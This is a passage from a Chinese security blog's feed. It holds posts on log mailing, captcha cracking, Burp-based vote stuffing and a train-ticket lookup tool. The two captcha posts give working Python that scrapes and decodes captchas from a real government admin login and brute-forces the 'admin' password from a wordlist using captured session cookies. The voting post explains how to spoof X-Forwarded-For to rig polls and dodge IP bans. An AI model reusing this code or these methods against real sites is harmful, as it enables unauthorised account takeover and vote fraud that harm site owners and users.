MIMEText(msg(), <span class="string">"plain"</span>, <span class="string">"utf-8"</span>)</div><div class="line">    info.attach(txt)</div><div class="line">    try:</div><div class="line">        smtpObj = smtplib.SMTP()</div><div class="line">        smtpObj.connect(mail_host, <span class="string">"25"</span>)</div><div class="line">        state = smtpObj.login(mail_user, mail_pass)</div><div class="line">        <span class="keyword">if</span> state[0] == 235:</div><div class="line">            smtpObj.sendmail(sender, receivers, info.as_string())</div><div class="line">            <span class="built_in">print</span> u<span class="string">"邮件发送成功"</span></div><div class="line">        smtpObj.quit()</div><div class="line">    except smtplib.SMTPException, e:</div><div class="line">        <span class="built_in">print</span> str(e)</div></pre></td></tr></table></figure></p>
<p>在来一个时间判断，就可以定时发送，我这里判断的是小时数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import time</div><div class="line">data_panduan = time.localtime()</div><div class="line"><span class="built_in">print</span> data_panduan</div><div class="line"><span class="keyword">while</span>(1):</div><div class="line"> <span class="keyword">if</span> data_panduan[3]==17:</div><div class="line">    <span class="built_in">print</span> 1</div><div class="line"> <span class="keyword">else</span>:</div><div class="line">    <span class="built_in">print</span> 0</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>挂到vps上面，每天到点自动发送日志，岂不是美滋滋！</p>
]]></content>
      
        <categories>
            
            <category> 实战过程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[验证码破解实战（下篇）]]></title>
      <url>http://www.warmeng.com/2017/07/28/idcode+/</url>
      <content type="html"><![CDATA[<p>综合上篇所述，功能拼接。</p>
<a id="more"></a>
<h2 id="step1-完整的验证码破解"><a href="#step1-完整的验证码破解" class="headerlink" title="step1.完整的验证码破解"></a>step1.完整的验证码破解</h2><p>效果图如下：<br><img src="/images/20170728/1.png" alt=""><br>附代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line">import requests</div><div class="line">from PIL import Image,ImageDraw</div><div class="line">import Levenshtein as lst</div><div class="line"></div><div class="line">def dowloadPic(imageUrl, filePath):<span class="comment">#图片抓取</span></div><div class="line">    r = requests.get(imageUrl)</div><div class="line">    with open(filePath, <span class="string">"wb"</span>) as code:</div><div class="line">        code.write(r.content)</div><div class="line">def getPixel(image, x, y, G, N):</div><div class="line">    L = image.getpixel((x, y))</div><div class="line"></div><div class="line">    <span class="keyword">if</span> L &gt; G:</div><div class="line">        L = True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        L = False</div><div class="line">    nearDots = 0</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x - 1, y - 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x - 1, y)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x - 1, y + 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x, y - 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x, y + 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x + 1, y - 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x + 1, y)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x + 1, y + 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> nearDots &lt; N:</div><div class="line">        <span class="built_in">return</span> image.getpixel((x, y - 1))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> None</div><div class="line">def clearNoise(image, G, N, Z):</div><div class="line">    draw = ImageDraw.Draw(image)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, Z):</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(1, image.size[0] - 1):</div><div class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> xrange(1, image.size[1] - 1):</div><div class="line">                color = getPixel(image, x, y, G, N)</div><div class="line">                <span class="keyword">if</span> color != None:</div><div class="line">                    draw.point((x, y), color)</div><div class="line">def buildvector(z,im):</div><div class="line">    d1 = &#123;&#125;</div><div class="line">    count = 0</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> im.getdata():</div><div class="line">        d1[count] = y</div><div class="line">        count += 1</div><div class="line"></div><div class="line">        <span class="keyword">if</span> y &gt; 200:</div><div class="line">            txt_j = 1</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            txt_j = 0</div><div class="line">        <span class="comment">#print txt_j</span></div><div class="line">        z_path = <span class="string">'/Users/nevermore/Desktop/yanzhengma/'</span>+str(z)+<span class="string">'.txt'</span></div><div class="line">        f = open(z_path, <span class="string">'a+'</span>)</div><div class="line">        f.write(str(txt_j))</div><div class="line">        f.close()</div><div class="line">    <span class="built_in">return</span> d1</div><div class="line">yanzhengma=[]</div><div class="line">boomshakalaka=<span class="string">''</span></div><div class="line"></div><div class="line">pic_collection_path = <span class="string">'http://cloud.xm.gov.cn/ids/admin/abc.code'</span></div><div class="line">pic_downpath = <span class="string">'/Users/nevermore/Desktop/yanzhengma/test.jpg'</span></div><div class="line">dowloadPic(pic_collection_path,pic_downpath)</div><div class="line"></div><div class="line">im = Image.open(pic_downpath)</div><div class="line">im.show()</div><div class="line">imgry = im.convert(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">threshold = 140</div><div class="line">table = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(256):</div><div class="line">    <span class="keyword">if</span> i &lt; threshold:</div><div class="line">        table.append(0)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        table.append(1)</div><div class="line">out = imgry.point(table, <span class="string">'1'</span>)</div><div class="line">out.save(pic_downpath)</div><div class="line"></div><div class="line">down_pic = Image.open(pic_downpath)</div><div class="line">clearNoise(down_pic, 170, 3, 1)</div><div class="line">down_pic.convert(<span class="string">'1'</span>)</div><div class="line">down_pic.save(pic_downpath)</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="step2-完整的爆破"><a href="#step2-完整的爆破" class="headerlink" title="step2.完整的爆破"></a>step2.完整的爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line">import urllib2</div><div class="line">import urllib</div><div class="line">header=&#123;&#125;</div><div class="line">header[<span class="string">'Host'</span>]=<span class="string">'cloud.xm.gov.cn'</span></div><div class="line">header[<span class="string">'User-Agent'</span>]=<span class="string">'Mozilla/5.0(Macintosh;IntelMacOSX10.12;rv:53.0)Gecko/20100101Firefox/53.0'</span></div><div class="line">header[<span class="string">'Accept'</span>]=<span class="string">'text/plain, */*; q=0.01'</span></div><div class="line">header[<span class="string">'Accept-Language'</span>]=<span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span></div><div class="line">header[<span class="string">'Accept-Encoding'</span>]=<span class="string">'deflate'</span></div><div class="line">header[<span class="string">'Content-Type'</span>]=<span class="string">'application/x-www-form-urlencoded'</span></div><div class="line">header[<span class="string">'X-Requested-With'</span>]=<span class="string">'XMLHttpRequest'</span></div><div class="line">header[<span class="string">'Referer'</span>]=<span class="string">'http://cloud.xm.gov.cn/ids/admin/login.jsp'</span></div><div class="line">header[<span class="string">'Content-Length'</span>]=<span class="string">'182'</span></div><div class="line">header[<span class="string">'Cookie'</span>]=<span class="string">'trsidsssosessionid=1FBE4E244EF6405736DF38596B57346D-192.168.192.10; JSESSIONID=8ECE31EA51FA81D7B078C4C4677E80F4'</span></div><div class="line">header[<span class="string">'Connection'</span>]=<span class="string">'close'</span></div><div class="line">f=open(<span class="string">"/Users/nevermore/Desktop/boom/666.txt"</span>,<span class="string">"r"</span>)</div><div class="line">lines=f.readlines()</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">    <span class="built_in">pwd</span> = line.strip()</div><div class="line">    <span class="built_in">print</span> <span class="built_in">pwd</span></div><div class="line">    strlogin = &#123;&#125;</div><div class="line">    strlogin[<span class="string">'loginType'</span>] = <span class="string">'userName'</span></div><div class="line">    strlogin[<span class="string">'loginKey'</span>] = <span class="string">'admin'</span></div><div class="line">    strlogin[<span class="string">'password'</span>] = <span class="built_in">pwd</span></div><div class="line">    strlogin[<span class="string">'sourceName'</span>] = <span class="string">'ids_internal'</span></div><div class="line">    strlogin[<span class="string">'login'</span>] = <span class="string">'true'</span></div><div class="line">    strlogin[<span class="string">'FAValue'</span>] = <span class="string">'%E5%8F%8C%E5%9B%A0%E5%AD%90%E9%AA%8C%E8%AF%81%E7%A0%81'</span></div><div class="line">    strlogin[<span class="string">'verifycode'</span>] = <span class="string">'7346'</span></div><div class="line">    strlogin[<span class="string">'time'</span>] = <span class="string">'1501201856253'</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    url = <span class="string">'http://cloud.xm.gov.cn/ids/admin/sendVerifyCodeFor2FA.jsp'</span></div><div class="line">    req = urllib2.Request(url, headers=header)</div><div class="line">    post_data = urllib.urlencode(strlogin)</div><div class="line">    r = urllib2.urlopen(req, post_data)</div><div class="line">    content = r.read()</div><div class="line">    content=content</div><div class="line"></div><div class="line">    <span class="built_in">print</span> content</div></pre></td></tr></table></figure>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>把两个工具合二为一，就顺利破解验证码进行爆破，恕我没有时间和精力再去整合了，赶紧在研究神经网络去</p>
]]></content>
      
        <categories>
            
            <category> 实战过程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[验证码破解实战（上篇）]]></title>
      <url>http://www.warmeng.com/2017/07/27/idcode/</url>
      <content type="html"><![CDATA[<p>不知道为什么pytesser始终都没有安装上，始终都用不了，但是听说那个误差挺大的，研究一套系统的验证码破解方法。</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>查阅某度后，了解了一下验证码识别的大致思路：样本采集，图片处理，特征值比对。这个流程。</p>
<h2 id="step1-样本采集"><a href="#step1-样本采集" class="headerlink" title="step1.样本采集"></a>step1.样本采集</h2><p>爬虫，还是爬虫。这里不需要多说<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line"></div><div class="line">def dowloadPic(imageUrl, filePath):</div><div class="line">    r = requests.get(imageUrl)</div><div class="line">    with open(filePath, <span class="string">"wb"</span>) as code:</div><div class="line">        code.write(r.content)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(1,51,1):</div><div class="line">    picpath = <span class="string">'http://cloud.xm.gov.cn/ids/admin/abc.code'</span></div><div class="line">    downpath = <span class="string">'/Users/nevermore/Desktop/yanzhengma'</span> + str(i) + <span class="string">'.jpg'</span></div><div class="line">    dowloadPic(picpath,downpath)</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="step2-图片处理"><a href="#step2-图片处理" class="headerlink" title="step2.图片处理"></a>step2.图片处理</h2><h3 id="二值化处理图片"><a href="#二值化处理图片" class="headerlink" title="二值化处理图片"></a>二值化处理图片</h3><p>这个二值化，设置一个阀值，通过这个阀值来把像素分类<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">from PIL import Image</div><div class="line">im = Image.open(<span class="string">'1.jpg'</span>)</div><div class="line">imgry = im.convert(<span class="string">'1'</span>)</div><div class="line">imgry.show()</div><div class="line"></div><div class="line">threshold = 140</div><div class="line">table = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(256):</div><div class="line">         <span class="keyword">if</span> i &lt;threshold:</div><div class="line">             table.append(0)</div><div class="line">         <span class="keyword">else</span>:</div><div class="line">             table.append(1)</div><div class="line"></div><div class="line">out = imgry.point(table,<span class="string">'1'</span>)</div><div class="line"></div><div class="line">imgry.save(<span class="string">"1.jpg"</span>)</div></pre></td></tr></table></figure></p>
<p>此时的验证码如图：<br><img src="/images/20170727/1.png" alt=""></p>
<h3 id="图片降噪分割"><a href="#图片降噪分割" class="headerlink" title="图片降噪分割"></a>图片降噪分割</h3><p>先将验证码图片进行降噪一次，如下图（原谅我没有用一张验证码的图，懒得调来调去了）：<br><img src="/images/20170727/2.png" alt=""><br>该图片是64x24的，根据图片像素和你的需求进行初步的裁剪（当然不是手工裁剪），然后再进行一次降噪，效果如下图：<br><img src="/images/20170727/3.png" alt=""><br><img src="/images/20170727/4.png" alt=""><br>接下来，图片分割元素，转换成非黑即白的图片格式，效果如图：<br><img src="/images/20170727/5.png" alt=""><br>附功能代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line">def getPixel(image, x, y, G, N):</div><div class="line">    L = image.getpixel((x, y))</div><div class="line">    <span class="built_in">print</span> L</div><div class="line">    <span class="keyword">if</span> L &gt; G:</div><div class="line">        L = True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        L = False</div><div class="line">    nearDots = 0</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x - 1, y - 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x - 1, y)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x - 1, y + 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x, y - 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x, y + 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x + 1, y - 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x + 1, y)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> L == (image.getpixel((x + 1, y + 1)) &gt; G):</div><div class="line">        nearDots += 1</div><div class="line">    <span class="keyword">if</span> nearDots &lt; N:</div><div class="line">        <span class="built_in">return</span> image.getpixel((x, y - 1))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> None</div><div class="line">def clearNoise(image, G, N, Z):</div><div class="line">    draw = ImageDraw.Draw(image)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, Z):</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(1, image.size[0] - 1):</div><div class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> xrange(1, image.size[1] - 1):</div><div class="line">                color = getPixel(image, x, y, G, N)</div><div class="line">                <span class="keyword">if</span> color != None:</div><div class="line">                    draw.point((x, y), color)</div><div class="line"></div><div class="line">def main():</div><div class="line">    image = Image.open(<span class="string">"1.jpg"</span>)</div><div class="line">    image = image.convert(<span class="string">"1"</span>)</div><div class="line">    clearNoise(image, 170, 3, 1)</div><div class="line">    image = image.convert(<span class="string">"1"</span>)</div><div class="line">    image.save(<span class="string">"result.jpg"</span>)</div><div class="line">    img = Image.open(<span class="string">'result.jpg'</span>)</div><div class="line"></div><div class="line">    box = (2, 4, 62, 20)</div><div class="line">    region = img.crop(box)</div><div class="line">    region.show()</div><div class="line">    region.save(<span class="string">'result.jpg'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(1, 5, 1):</div><div class="line">        box = ((i - 1) * 15, 0, i * 15, 16)</div><div class="line">        f = Image.open(<span class="string">'result.jpg'</span>)</div><div class="line">        <span class="built_in">fg</span> = f.crop(box)</div><div class="line">        <span class="built_in">fg</span> = fg.convert(<span class="string">'1'</span>)</div><div class="line">        fg.show()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="特征值比对"><a href="#特征值比对" class="headerlink" title="特征值比对"></a>特征值比对</h2><h3 id="将图片元素归类，并且把图片输出成txt格式的字符串，如下图所示："><a href="#将图片元素归类，并且把图片输出成txt格式的字符串，如下图所示：" class="headerlink" title="将图片元素归类，并且把图片输出成txt格式的字符串，如下图所示："></a>将图片元素归类，并且把图片输出成txt格式的字符串，如下图所示：</h3><p><img src="/images/20170727/6.png" alt=""><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">from PIL import Image</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(0,10,1):</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(1,11,1):</div><div class="line">        picpath = <span class="string">'/Users/nevermore/Desktop/yanzhengma/collection_fg/'</span>+str(x)+<span class="string">'/'</span>+str(y)+<span class="string">'.png'</span></div><div class="line">        def buildvector(im):</div><div class="line">            d1 = &#123;&#125;</div><div class="line">            count = 0</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> im.getdata():</div><div class="line">                d1[count] = i</div><div class="line">                count += 1</div><div class="line"></div><div class="line">                <span class="keyword">if</span> i &gt; 200:</div><div class="line">                    j = 1</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    j = 0</div><div class="line">                <span class="built_in">print</span> j</div><div class="line">                f = open(<span class="string">'/Users/nevermore/Desktop/yanzhengma/collection_fg/'</span>+str(x)+<span class="string">'/'</span>+str(y)+<span class="string">'.txt'</span>, <span class="string">'a+'</span>)</div><div class="line">                f.write(str(j))</div><div class="line">                f.close()</div><div class="line">            <span class="built_in">return</span> d1</div><div class="line"></div><div class="line">        <span class="built_in">print</span> picpath</div><div class="line">        im = Image.open(picpath)</div><div class="line">        im = im.convert(<span class="string">'1'</span>)</div><div class="line">        buildvector(im)</div></pre></td></tr></table></figure></p>
<p>将需要识别的图片转换成字符串之后与你元素归类的所有字符串进行差异对比，没一个数字集合中取其平均值，返回最大平均值所在的位置即为，识别图片的字母<br><img src="/images/20170727/7.png" alt=""></p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>接下来就是把这些代码功能片段整合，配合python的web爆破工具，功能拼接一下，变成一个完整的工具。未完待续。。。。。。。。。。。。。。。。。。。。。。。。。。</p>
]]></content>
      
        <categories>
            
            <category> 实战过程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用bp进行网站刷票]]></title>
      <url>http://www.warmeng.com/2017/07/23/bp/</url>
      <content type="html"><![CDATA[<p>别加班了，受不了了！</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>即是网站刷票的一种思路，也是在渗透过程中被封ip的一种思路。</p>
<h2 id="XFF"><a href="#XFF" class="headerlink" title="XFF"></a>XFF</h2><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。</p>
<h2 id="网页刷票的过程"><a href="#网页刷票的过程" class="headerlink" title="网页刷票的过程"></a>网页刷票的过程</h2><p>step1.<br>使用brupsuite对点击投票的地方进行抓包，并且在请求头中添加X-Forwarded-For。随便写一个ip地址，如下图：<br><img src="/images/20170723/1.jpg" alt=""><br>step2.<br>修改xff的值，此时发现之前投过票后仍然能投票了，如下图：<br><img src="/images/20170723/2.jpg" alt=""><br>step3.<br>对xff的值进行爆破，因为ip地址有XXX.XXX.XXX.XXX,所以你爆破的次数就是相当于你刷票的次数了，在爆破过程中需要注意线程不要太大，速度也不要太快，有的服务器也承受不了。具体参考bp使用手册中：<br><img src="/images/20170723/3.jpg" alt=""><br>step4.<br>睡觉去吧！</p>
<hr>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>记得在python群中，有人就问过，爬虫在爬取的过程中被封ip了怎么办，其实有的时候没有必要设置各种的代理，在headers中添加一个XFF就可以了，并且遍历一个ip的字典，再加上sleep（）函数完美解决问题。</p>
]]></content>
      
        <categories>
            
            <category> 实战过程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[自制python小工具]]></title>
      <url>http://www.warmeng.com/2017/07/01/pypypy/</url>
      <content type="html"><![CDATA[<p>2017上半年结束了！终于来到一个有网的地方！</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>学着写了些python的小玩意，记录一下。感谢<a href="https://www.shiyanlou.com/" target="_blank" rel="external">实验楼</a>.</p>
<h2 id="12306查看器"><a href="#12306查看器" class="headerlink" title="12306查看器"></a>12306查看器</h2><p>输入地名，不用登录12306，查看铁路交通信息。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from docopt import docopt</div><div class="line">from prettytable import PrettyTable</div><div class="line">from colorama import init, Fore</div><div class="line"></div><div class="line">from stations import stations</div><div class="line"></div><div class="line"></div><div class="line">init()</div><div class="line"></div><div class="line">class TrainsCollection:</div><div class="line"></div><div class="line">    header = <span class="string">'车次 车站 时间 历时 一等 二等 软卧 硬卧 硬座 无座'</span>.split()</div><div class="line"></div><div class="line">    def __init__(self, available_trains, options):</div><div class="line">        <span class="string">""</span><span class="string">"查询到的火车班次集合</span></div><div class="line"></div><div class="line">        :param available_trains: 一个列表, 包含可获得的火车班次, 每个</div><div class="line">                                 火车班次是一个字典</div><div class="line">        :param options: 查询的选项, 如高铁, 动车, etc...</div><div class="line">        "<span class="string">""</span></div><div class="line">        self.available_trains = available_trains</div><div class="line">        self.options = options</div><div class="line"></div><div class="line">    def _get_duration(self, raw_train):</div><div class="line">        duration = raw_train.get(<span class="string">'lishi'</span>).replace(<span class="string">':'</span>, <span class="string">'小时'</span>) + <span class="string">'分'</span></div><div class="line">        <span class="keyword">if</span> duration.startswith(<span class="string">'00'</span>):</div><div class="line">            <span class="built_in">return</span> duration[4:]</div><div class="line">        <span class="keyword">if</span> duration.startswith(<span class="string">'0'</span>):</div><div class="line">            <span class="built_in">return</span> duration[1:]</div><div class="line">        <span class="built_in">return</span> duration</div><div class="line"></div><div class="line">    @property</div><div class="line">    def trains(self):</div><div class="line">        <span class="keyword">for</span> raw_train <span class="keyword">in</span> self.available_trains:</div><div class="line">            train_no = raw_train[<span class="string">'station_train_code'</span>]</div><div class="line">            initial = train_no[0].lower()</div><div class="line">            <span class="keyword">if</span> not self.options or initial <span class="keyword">in</span> self.options:</div><div class="line">                train = [</div><div class="line">                    train_no,</div><div class="line">                    <span class="string">'\n'</span>.join([Fore.GREEN + raw_train[<span class="string">'from_station_name'</span>] + Fore.RESET,</div><div class="line">                               Fore.RED + raw_train[<span class="string">'to_station_name'</span>] + Fore.RESET]),</div><div class="line">                    <span class="string">'\n'</span>.join([Fore.GREEN + raw_train[<span class="string">'start_time'</span>] + Fore.RESET,</div><div class="line">                               Fore.RED + raw_train[<span class="string">'arrive_time'</span>] + Fore.RESET]),</div><div class="line">                    self._get_duration(raw_train),</div><div class="line">                    